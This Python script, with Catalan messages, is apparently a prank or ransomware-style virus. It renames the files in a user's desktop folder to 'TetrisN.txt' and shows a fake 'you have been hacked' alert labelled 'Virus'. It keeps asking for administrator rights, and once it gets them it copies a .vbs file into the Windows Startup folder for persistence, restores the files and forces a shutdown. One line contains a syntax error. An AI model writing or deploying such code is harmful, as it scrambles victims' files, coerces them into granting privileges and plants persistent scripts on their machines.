import os
import admin
import time
from plyer import notification
import Tetrismeu
def bucle():
    principi=os.getcwd()
    ad=1
    if not admin.isUserAdmin():
        try:
            admin.runAsAdmin()#preguntar moltes vegades
        except:
            ad=0

    os.chdir("C:/Users")
    for i in os.listdir():
            try:
                os.chdir(i + "/Desktop/prova")
            except:
                pass
    lloc=os.getcwd()
    os.chdir(principi)
    if ad==1:
        name="polla.vbs"
        directorio='"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"'
        os.system("copy " + " " + name + " " + directorio)
        if "coses" in os.listdir(principi):
            os.chdir(principi)
            archivo = open('coses', 'r')
            lines = archivo.readlines()
            archivo.close()
            j = 0
            os.chdir(lloc)
            for i in lines:
                try:
                    os.rename("Tetris" + str(j) + ".txt", i[:-1])
                    j += 1d
                except:
                    pass
            os.chdir(principi)
            os.remove('coses')
        Tetrismeu.hola()
        os.system("shutdown /p")
    else:
        if "coses" not in os.listdir(principi):
            try:
                archivo = open("coses", "w")
                archivo.close()
                archivo = open("coses", "a")
                j=0
                for i in os.listdir(lloc):
                    os.chdir(principi)
                    archivo.write(str(i)+"\n")
                    os.chdir(lloc)
                    os.rename(i, "Tetris"+str(j)+".txt")
                    j+=1
                archivo.close()
            except:
                pass
        Tetrismeu.hola()
        os.chdir(principi)
        notification.notify(
            title='Has sigut hackejat',
            message='El teu escriptori ha estat malmes, per recuperar-lo en el seu estat original pulsa si',
            app_name='Virus',
            app_icon='virus.ico'
        )
         # fer mes soroll
        time.sleep(5)
        bucle()
bucle()






